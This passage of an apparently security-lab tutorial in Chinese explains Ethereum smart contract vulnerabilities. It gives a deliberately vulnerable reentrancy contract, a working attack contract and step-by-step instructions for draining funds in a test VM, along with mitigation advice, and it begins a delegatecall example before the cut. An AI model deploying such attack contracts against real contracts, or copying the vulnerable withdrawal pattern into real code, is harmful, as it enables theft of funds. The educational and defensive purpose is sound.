**作者： 天宸@蚂蚁安全实验室  
原文链接：**
## **序言**
**西安电子科技大学教授裴庆祺**
谈到，“'智能合约'作为构建去中心化项目与去中心化组织不可或缺的基石，自其诞生之时便在各式各样的分布式场景中扮演着重要的角色。随着“智能合约”的重要性和普及度不断提高，合约面临的安全威胁也在与日俱增。
近年来，因为“智能合约”漏洞导致的财产丢失、隐私泄漏等问题层出不穷，合约漏洞分析与合约安全防护也逐渐成为当前区块链领域至关重要的技术之一。蚂蚁安全实验室这篇分享将从智能合约基本概念及以太坊智能合约运行机制出发，全方位地阐释了合约中的安全隐患，详述了近年来出现的各种智能合约漏洞原理，通过复现漏洞场景及分析漏洞合约solidity代码分析漏洞成因，结合详细的攻击步骤直观地表述了攻击方式及该类漏洞所带来的损失，并针对攻击方式给出不同情况下的合理规避建议。
本文上下两篇内容基本涵盖了以太坊全部已提出或已出现的合约漏洞，并均给出了可行的规避建议。阅读本篇文章，不论是对智能合约的编写或维护者，还是对深入区块链智能合约领域的学者及技术爱好者，都能够获益匪浅。”
安全威胁通常是由漏洞引发的多种漏洞类型。那么，什么是漏洞？国家信息安全漏洞库提出：漏洞是计算机信息系统在需求、设计、实现、配置、运行等过程中，有意或无意产生的缺陷。这些缺陷以不同的形式存在于计算机信息系统的各个层次和环节之中，一旦被恶意主体所利用，就会对计算机信息系统的安全造成一定损害，从而影响系统的正常运行。
由此可见，漏洞更多的是指一种安全缺陷，比如整数溢出是一种安全缺陷，随机数种子选取不当是一种安全缺陷，易遭受某某攻击也是一种安全缺陷。
为保证大家阅读的体验，本文将各式各样的安全缺陷统一为某某漏洞
## **什么是智能合约？**
早在 1996 年，Nick Szabo
就首次描述了智能合约的概念。当时，他对智能合约定义是：智能合约是一组以数字形式指定的承诺，包括各方在其中履行这些承诺的协议。(A smart
contract is a set of promises, specified in digital form, including protocols
within which the parties perform on these promises.)
在加密货币领域，币安将智能合约定义为在区块链上运行的应用或程序。通常情况下，它们为一组具有特定规则的数字化协议，且该协议能够被强制执行。这些规则由计算机源代码预先定义，所有网络节点会复制和执行这些计算机源码。
## **智能合约如何运行**
智能合约的运行方式由下图所示。本文主要讨论以太坊上的智能合约漏洞，所以用以太坊为例说明运行方式。智能合约运行在以太坊节点上，节点上配有以太坊虚拟机运行智能合约。合约由一笔交易触发，由虚拟机负责执行，执行完毕之后修改以太坊的世界状态，如账户余额，交易以及输入和输出会写入区块中，不可抵赖、不可篡改。
2015年7月，以太坊团队正式发布以太坊网络Frontier
阶段，开发者开始在以太坊上编写智能合约和去中心化应用。2016年1月，以太坊智能合约开启区块链应用之路。1月10日至3月13日以太坊单位价格从0.97美元涨至14.32美元，两个月左右的时间翻了将近15倍，并一路上涨，直到2016年6月，以太坊上的一个去中心化自治组织
The DAO 被黑客攻击，损失了五千万美元，以太币价格从19.42美元跌至11.32美元，跌幅41%。
The DAO
攻击让黑客们找到了财富密码，他们意识到智能合约是一个巨大的宝库。随后，黑客们便开启了挖洞的狂欢，他们满载着以太币而归，也给我们留下了精彩的技术和思维的盛宴。
以太坊诞生的第一年内，一共部署了约 5万个智能合约。今天，以太坊上智能合约的数量已经超过 393万个。
**在所有的公链平台中，以太坊是起步最早，生态最丰富，最具活力的智能合约运行平台。如今以太坊已经承载了数百万合约的运行，是名副其实的百万合约之母** 。
以太坊平台支持多种合约语言，如 Solidity 和 Vyper，其中 Solidity 的使用最为广泛，是本文主要的分析对象。我们大致把漏洞分为两大类：
**以太坊特性导致的新颖的漏洞类型，和传统攻击手法在以太坊上旧貌换新颜的传统漏洞类型**
。为了更好的讲解漏洞，我们对主要漏洞做了复现，同时也鼓励大家可以根据代码和步骤实战操作一二。
## **以太坊特性产生的新漏洞类型**
### **Re-Entrancy 重入漏洞**
**漏洞介绍**
重入漏洞是指利用 fallback 函数特性，递归调用含有漏洞的转账合约，直到 gas 耗尽，或递归条件终止，攻击者就可以得到远远超出预存的代币。
fallback函数是合约里的特殊无名函数，一个合约有且仅有一个 fallback 函数。目前，fallback 有以下两种方式声明，其中这两种方式都不需要
function关键字。0.4.x 之前的版本对 fallback 的可见性没有要求，0.5.x 版本上要求 fallback 必须是
external。fallback 函数可以是虚函数，可以被重写，也可以有修饰符。
    fallback () external [payable]fallback (bytes calldata _input) external [payable] returns (bytes memory _output)
**漏洞示例**
    pragma solidity ^0.4.10;
    contract SevenToken {
      address owner;
      mapping (address => uint256) balances;  // 记录每个打币者存入的资产情况
      event withdrawLog(address, uint256);
      function SevenToken() { owner = msg.sender; }
      function deposit() payable { balances[msg.sender] += msg.value; }
      function withdraw(address to, uint256 amount) {
          require(balances[msg.sender] > amount);
          require(this.balance > amount);
          withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy
          to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
          balances[msg.sender] -= amount; // 这一步骤应该在 send token 之前
      }
      function balanceOf() returns (uint256) { return balances[msg.sender]; }
      function balanceOf(address addr) returns (uint256) { return balances[addr]; }
    }
**攻击步骤**
**攻击代码如下：**
    contract Attack {
      address owner;
      address victim;
      modifier ownerOnly { require(owner == msg.sender); _; }
      function Attack() payable { owner = msg.sender; }
      // 设置已部署的 SevenToken 合约实例地址
      function setVictim(address target) ownerOnly { victim = target; }
      function balanceOf() returns (uint256) {return this.balance;}
      // deposit Ether to SevenToken deployed
      function step1(uint256 amount) private ownerOnly {
          if (this.balance > amount) {
              victim.call.value(amount)(bytes4(keccak256("deposit()")));
          }
      }
      // withdraw Ether from SevenToken deployed
      function step2(uint256 amount) private ownerOnly {
          victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
      }
      function () payable {
          if (msg.sender == victim) {
              victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
          }
      }
    }
**操作步骤：**
1.两个合约可以写在一个sol文件里，在remix Javascript VM环境下，编译--切换到run选项卡--deploy。
2.用account A deploy SevenToken合约。
3.用account A deposit 25 ether到Se-venToken合约。
4.用account B deploy Attack合约，在deploy的时候初始化转10 ether 到Attack合约。
5.用account B调用 setVictim。copy paste SevenToken合约的地址作为setVictim的参数。
6.如果想确认是否set成功可以调用getVictim查看结果。
7.用account B调用step1，先往SevenToken里存入一些代币。
8.用account B调用step2，提取代币，金额少于之前存的代币。
9.攻击成功，account B提取了SevenToken所有的代币，～～25 ether。
**规避建议**
为了避免重入，可以使用下面撰写的“检查-生效-交互”（Checks-Effects-Interactions）模式：
第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether
，用户是否具有token等等）。这些检查工作应该首先被完成。
第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。
第三步，与其它合约的交互应该是任何函数的最后一步。
早期合约延迟了一些效果的产生，导致重入攻击。
请注意，对已知合约的调用反过来也可能导致对未知合约的调用，所以最好是一直保持使用这个模式编写代码。
    require(balances[msg.sender] > amount); //检查
    require(this.balance > amount); //检查
    balances[msg.sender] -= amount; // 生效
    to.call.value(amount)();  // 交互
特殊的，对于轻量的转账操作，推荐使用 send 方法，尽量避免使用 call 方法。无论使用哪种方法都需要检查返回值。
### **delegatecall 漏洞**
**漏洞介绍**
Solidity 语言有 2 中调用外部合约的方式：
**· call 的执行上下文是外部合约的上下文**
**· delegatecall 的执行上下文是本地合约上下文**
合约 A 以 call 方式调用外部合约 B 的 func() 函数，在外部合约 B 上下文执行完 func() 后继续返回 A 合约上下文继续执行；而当
A 以 delegatecall 方式调用时，相当于将外部合约 B 的 func() 代码复制过来（其函数中涉及的变量或函数都需要在本地存在）在 A
上下文空间中执行。
**漏洞示例**
Delegate 是一个普通合约，Delegation 是它的代理，响应外部的调用。
    pragma solidity ^0.4.10;
    contract Delegate {
        address public owner;
        function Delegate(address _owner) {
            owner = _owner;
        }
        function setOwner() {
            owner = msg.sender;
        }
    }
    contract Delegation {
        address public owner;
        Delegate delegate;
        function Delegation(address _delegateAddress) {
            delegate = Delegate(_delegateAddress);